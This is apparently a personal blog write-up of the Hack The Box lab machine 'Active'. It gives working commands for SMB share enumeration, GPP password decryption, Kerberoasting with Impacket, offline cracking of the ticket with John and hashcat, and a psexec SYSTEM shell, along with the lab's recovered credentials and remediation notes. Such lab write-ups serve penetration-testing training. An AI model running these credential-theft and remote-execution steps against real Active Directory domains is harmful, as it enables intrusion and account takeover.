---
layout: post
title:  "HTB: Active"
date:   2023-10-04 09:19:20 +0700
tags: [htb,pentesting,ctf]
categories: jekyll update
usemathjax: true
---

> ## **Overview**

Active was an example of an easy box that still provided a lot of opportunity to learn. The box was centered around common vulnerabilities associated with Active Directory. There’s a good chance to practice SMB enumeration. It also gives the opportunity to use Kerberoasting against a Windows Domain, which, if you’re not a pentester, you may not have had the chance to do before.

> ## **Enumeration**

### **Port Scan Results**

| IP Address | Ports Open |
| --- | --- |
| 10.10.10.100 | TCP: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5722, 9389
|              | UDP: 123, 137 

### **SMB Enumeration - I**

Since this is a Windows host, Enumerating any readable shares can be really useful.

```bash
smbmap -H 10.10.10.100
```

[![image.png](https://i.postimg.cc/SNbzxzty/image.png)](https://postimg.cc/5jptPjVG)

And we see that we can only access the share *Replication.*

Connecting to the share using **smbclient**

```bash
smbclient //10.10.10.100/Replication
```

[![image.png](https://i.postimg.cc/LXrgfq93/image.png)](https://postimg.cc/sQ42CgZM)

Once we gain access to the share, we can locate a file named Groups.xml within the directory path 

```
**\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\**
```

Upon examining this file, we will discover both a username and an encrypted password.

[![image.png](https://i.postimg.cc/9Q3p9DRF/image.png)](https://postimg.cc/crmwy4BV)

```bash
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

### **GPP Passwords**

Whenever a new Group Policy Preference (GPP) is created, there’s an 
xml file created in the SYSVOL share with that config data, including 
any passwords associated with the GPP. For security, Microsoft AES 
encrypts the password before it’s stored as cpassword. But then Microsoft [published the key](https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx) on MSDN!

Microsoft issued a patch in 2014 that prevented admins from putting 
passwords into GPP. For more 
details, check out this [AD Security post](https://adsecurity.org/?p=2288).

**Decrypting GPP** 

a tool called "gpp-decrypt" that can be utilized for decrypting GPP (Group Policy Preferences) passwords.

[![image.png](https://i.postimg.cc/HnsNfV4C/image.png)](https://postimg.cc/1n2MFRjW)

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

And we got the password **GPPstillStandingStrong2k18**.

### **SMB Enumeration - II**

With a username and password, I can access 3 more shares

There is a Users share that looks interesting

```bash
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        C$                                                      NO ACCESS
        IPC$                                                    NO ACCESS
        NETLOGON                                                READ ONLY
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY
        Users                                                   READ ON
```

Connecting to the SMB share using **smbclient**

```bash
smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
```

And that is enough to get user.txt

> ## Initial Access – Kerberoasting

**Vulnerability Explanation:** Kerberoasting is a technique that allows an attacker to steal the KRB_TGS ticket, that is encrypted with RC4, to brute force application services hash to extract its password.

**Vulnerability Fix:** [Consider using Group Managed Service Accounts](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview) rather than service accounts with static passwords . [Consider upgrading to an Active Directory Domain or forest level](https://adsecurity.org/?p=3377) which supports advanced Kerberos armoring. More information [here](https://www.lepide.com/blog/how-to-prevent-kerberoasting-attacks/)

**Severity: [High](https://capec.mitre.org/data/definitions/509.html)**

**Steps to reproduce the attack:** Since we already possess credentials, we'll use the "GetUserSPNs.py" script from Impacket. This script will enable us to retrieve a list of service usernames linked to regular user accounts and obtain a ticket that I can attempt to crack.

**Proof of Concept**


```bash
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
```

It also gives me the ticket, which I can try to brute force decrypt to get the user’s password:

**Cracking the ticket**

With John

```bash
./john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

If youre facing errors, make sure you use the [jumbo version of john](https://github.com/magnumripper/JohnTheRipper).

With Hashcat

```bash
$ hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
```

And we got the administrator password : **Ticketmaster1968**

> ##  Administrator Access

As we already have admin creds through kerberoasting, we can get the system shell using psexec.py

```powershell
psexec.py active.htb/administrator@10.10.10.100
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file dMCaaHzA.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service aYMa on 10.10.10.100.....
[*] Starting service aYMa.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

## Have any questions
Do you have any questions? Feel free to reach out to me on [twitter](https://twitter.com/rach1tarora) or on [LinkedIn](https://www.linkedin.com/in/rach1tarora/).